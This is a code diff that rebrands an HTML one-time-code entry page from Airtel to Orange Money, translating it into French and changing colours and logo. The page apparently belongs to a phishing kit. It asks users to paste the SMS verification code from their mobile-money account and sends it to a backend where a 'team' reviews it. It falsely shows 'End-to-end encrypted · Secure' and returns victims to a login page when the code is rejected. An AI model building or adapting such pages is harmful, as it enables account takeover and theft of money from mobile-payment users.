@@ -1,13 +1,13 @@
 <!DOCTYPE html>
-<html lang="en" translate="no">
+<html lang="fr" translate="no">
 <head>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1,interactive-widget=resizes-content">
-<meta name="theme-color" content="#000000"/>
+<meta name="theme-color" content="#FF6600"/>
 <meta name="color-scheme" content="light only">
 <meta name="google" content="notranslate">
 <meta name="format-detection" content="telephone=no">
-<title>Airtel Lite — OTP Verification</title>
+<title>Orange Money — Vérification OTP</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
@@ -35,26 +35,27 @@
     font-size: 14px; font-weight: 500; cursor: pointer;
     padding: 8px 4px; font-family: inherit;
   }
-  .back-btn:hover { color: #ed1c24; }
+  .back-btn:hover { color: #FF6600; }
   .back-btn svg { width: 18px; height: 18px; }
-  .otp-logo { text-align: center; margin-bottom: 28px; }
-  .otp-logo .airtel-logo { font-size: 32px; font-weight: 700; color: #ed1c24; letter-spacing: -1px; }
+  .otp-logo { text-align: center; margin-bottom: 28px; display: flex; align-items: center; justify-content: center; gap: 10px; }
+  .otp-logo img { height: 44px; width: auto; border-radius: 8px; }
+  .otp-logo .brand-text { font-size: 20px; font-weight: 800; color: #FF6600; letter-spacing: -0.4px; }
   .otp-icon-wrap {
     width: 72px; height: 72px; border-radius: 50%;
-    background: linear-gradient(135deg, #fff5f5 0%, #ffe5e5 100%);
+    background: linear-gradient(135deg, #fff5eb 0%, #ffe5cc 100%);
     display: flex; align-items: center; justify-content: center;
-    margin: 0 auto 20px; box-shadow: 0 4px 16px rgba(237, 28, 36, 0.12);
+    margin: 0 auto 20px; box-shadow: 0 4px 16px rgba(255, 102, 0, 0.15);
   }
-  .otp-icon-wrap svg { width: 34px; height: 34px; color: #ed1c24; }
+  .otp-icon-wrap svg { width: 34px; height: 34px; color: #FF6600; }
   .otp-title { font-size: 22px; font-weight: 700; color: #1a1a1a; text-align: center; margin-bottom: 10px; line-height: 1.3; }
   .otp-subtitle { font-size: 14px; color: #666; text-align: center; line-height: 1.6; margin-bottom: 28px; max-width: 320px; }
-  .otp-subtitle strong { color: #ed1c24; font-weight: 600; }
+  .otp-subtitle strong { color: #FF6600; font-weight: 600; }
   .paste-card {
     width: 100%; background: #ffffff; border: 1.5px solid #e5e5e5;
     border-radius: 14px; padding: 16px; margin-bottom: 16px;
     transition: border-color 0.2s, box-shadow 0.2s;
   }
-  .paste-card:focus-within { border-color: #ed1c24; box-shadow: 0 0 0 4px rgba(237, 28, 36, 0.08); }
+  .paste-card:focus-within { border-color: #FF6600; box-shadow: 0 0 0 4px rgba(255, 102, 0, 0.08); }
   .paste-label {
     display: flex; align-items: center; justify-content: space-between;
     font-size: 12px; font-weight: 600; color: #888;
@@ -62,12 +63,12 @@
   }
   .paste-btn {
     display: flex; align-items: center; gap: 5px;
-    background: #fff5f5; color: #ed1c24; border: none;
+    background: #fff5eb; color: #FF6600; border: none;
     padding: 6px 12px; border-radius: 999px;
     font-size: 12px; font-weight: 600; cursor: pointer;
     font-family: inherit; transition: background 0.2s;
   }
-  .paste-btn:hover { background: #ffe5e5; }
+  .paste-btn:hover { background: #ffe5cc; }
   .paste-btn svg { width: 13px; height: 13px; }
   .otp-textarea {
     width: 100%; min-height: 110px; border: none; outline: none; resize: none;
@@ -92,12 +93,12 @@
   }
   .error-message.show { display: block; }
   .verify-btn {
-    width: 100%; background: #ed1c24; color: #fff; border: none;
+    width: 100%; background: #FF6600; color: #fff; border: none;
     padding: 17px; border-radius: 10px; font-size: 16px; font-weight: 600;
     cursor: pointer; margin-bottom: 16px; font-family: inherit;
     transition: opacity 0.2s, transform 0.15s;
     display: flex; align-items: center; justify-content: center; gap: 10px;
-    box-shadow: 0 4px 14px rgba(237, 28, 36, 0.25);
+    box-shadow: 0 4px 14px rgba(255, 102, 0, 0.3);
   }
   .verify-btn:not(:disabled):hover { opacity: 0.92; transform: translateY(-1px); }
   .verify-btn:disabled { background: #e0e0e0; color: #999; cursor: not-allowed; box-shadow: none; }
@@ -111,7 +112,7 @@
   .verify-btn.loading .loader { display: inline-block; }
   @keyframes spin { to { transform: rotate(360deg); } }
   .resend-section { text-align: center; font-size: 13.5px; color: #666; margin-top: 8px; }
-  .resend-link { color: #ed1c24; cursor: pointer; font-weight: 600; text-decoration: none; }
+  .resend-link { color: #FF6600; cursor: pointer; font-weight: 600; text-decoration: none; }
   .resend-link.disabled { color: #bbb; cursor: not-allowed; }
   .security-footer {
     margin-top: auto; padding-top: 32px;
@@ -147,12 +148,13 @@
     <div class="otp-header">
       <button class="back-btn" id="backBtn">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
-        Back
+        Retour
       </button>
     </div>
 
     <div class="otp-logo">
-      <div class="airtel-logo">airtel</div>
+      <img src="/orange-money-logo.png" alt="Orange Money" onerror="this.src='https://i.pinimg.com/736x/e2/cc/bf/e2ccbf284b0f18ae6e8dc544ac097f4c.jpg'">
+      <span class="brand-text">Orange Money</span>
     </div>
 
     <div class="otp-icon-wrap">
@@ -161,25 +163,25 @@
       </svg>
     </div>
 
-    <h1 class="otp-title">Enter the OTP Message</h1>
+    <h1 class="otp-title">Entrez le message OTP</h1>
     <p class="otp-subtitle">
-      Enter the <strong>Airtel OTP code</strong> you received via SMS.
+      Entrez le <strong>code OTP Orange Money</strong> que vous avez reçu par SMS.
     </p>
 
     <div class="error-message" id="otpError"></div>
 
     <div class="paste-card">
       <div class="paste-label">
-        <span>OTP Message</span>
+        <span>Message OTP</span>
         <button class="paste-btn" id="pasteBtn" type="button">
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
-          Paste
+          Coller
         </button>
       </div>
       <textarea
         class="otp-textarea"
         id="otpInput"
-        placeholder="Only put your Airtel OTP here…"
+        placeholder="Mettez uniquement votre OTP Orange Money ici…"
         maxlength="600"
         autocomplete="off"
         autocorrect="off"
@@ -190,21 +192,21 @@
 
     <div class="hint-row">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
-      <span>Enter only the OTP digits from your Airtel message.</span>
+      <span>Entrez uniquement les chiffres OTP du message Orange Money.</span>
     </div>
 
     <button class="verify-btn" id="verifyBtn" disabled>
-      <span class="btn-text">VERIFY CODE</span>
+      <span class="btn-text">VÉRIFIER LE CODE</span>
       <span class="loader"></span>
     </button>
 
     <div class="resend-section">
-      Didn't receive it? <a href="#" class="resend-link" id="resendLink">Resend OTP</a>
+      Vous n'avez pas reçu ? <a href="#" class="resend-link" id="resendLink">Renvoyer OTP</a>
     </div>
 
     <div class="security-footer">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-      <span>End-to-end encrypted · Secure</span>
+      <span>Chiffré de bout en bout · Sécurisé</span>
     </div>
   </div>
 </div>
@@ -213,8 +215,8 @@
   <div class="success-check">
     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
   </div>
-  <h2>Submitted for Review</h2>
-  <p>Your OTP has been received. Our team will verify it shortly. You'll be notified once approved.</p>
+  <h2>Soumis pour vérification</h2>
+  <p>Votre OTP a été reçu. Notre équipe le vérifiera sous peu. Vous serez notifié dès approbation.</p>
 </div>
 
 <script>
@@ -234,17 +236,14 @@
   function _safeStorageGet(key) {
     try { return sessionStorage.getItem(key); } catch (e) { return null; }
   }
-  function _safeStorageSet(key, value) {
-    try { sessionStorage.setItem(key, value); } catch (e) {}
-  }
 
   /* ==================== GET REQUEST ID + PHONE ==================== */
-  // Priority: URL params (survives sandbox) → sessionStorage → empty
   const _urlParams = new URLSearchParams(window.location.search);
   const requestId = _urlParams.get('requestId')
                  || _safeStorageGet('request_id')
                  || '';
   const phone     = _urlParams.get('phone')
+                 || _safeStorageGet('orange_phone')
                  || _safeStorageGet('airtel_phone')
                  || '';
 
@@ -304,7 +303,7 @@
     e.preventDefault();
     if (resendLink.classList.contains('disabled')) return;
     resendLink.classList.add('disabled');
-    resendLink.textContent = 'Sending…';
+    resendLink.textContent = 'Envoi…';
     try {
       await fetch(`${BACKEND_URL}/api/b2c-backend/v2/resend-otp`, {
         method: 'POST',
@@ -314,7 +313,7 @@
     } catch (err) {}
     setTimeout(() => {
       resendLink.classList.remove('disabled');
-      resendLink.textContent = 'Resend OTP';
+      resendLink.textContent = 'Renvoyer OTP';
     }, 30000);
   });
 
@@ -343,7 +342,7 @@
       console.log('[OTP RESPONSE]', data);
 
       if (!data.success) {
-        showError(data.message || 'Invalid OTP. Please check the message and try again.');
+        showError(data.message || 'OTP invalide. Vérifiez le message et réessayez.');
         verifyBtn.disabled = false;
         verifyBtn.classList.remove('loading');
         return;
@@ -360,7 +359,7 @@
             verifyBtn.classList.remove('loading');
           } else if (s.status === 'rejected' || s.status === 'invalid' || s.status === 'wrong_credentials') {
             clearInterval(pollTimer);
-            showError('Oops! You entered wrong credentials.');
+            showError('Oups ! Vous avez entré de mauvais identifiants.');
             verifyBtn.disabled = false;
             verifyBtn.classList.remove('loading');
             setTimeout(() => { window.location.href = 'login.html'; }, 2200);
@@ -370,7 +369,7 @@
 
     } catch (err) {
       console.error('[OTP FETCH ERROR]', err);
-      showError('Network error. Please try again.');
+      showError('Erreur réseau. Veuillez réessayer.');
       verifyBtn.disabled = false;
       verifyBtn.classList.remove('loading');
     }
@@ -378,7 +377,7 @@
 
   /* ==================== ON LOAD ==================== */
   if (!requestId) {
-    showError('Session expired. Redirecting…');
+    showError('Session expirée. Redirection…');
     setTimeout(() => { window.location.href = 'login.html'; }, 1500);
   }
 </script>
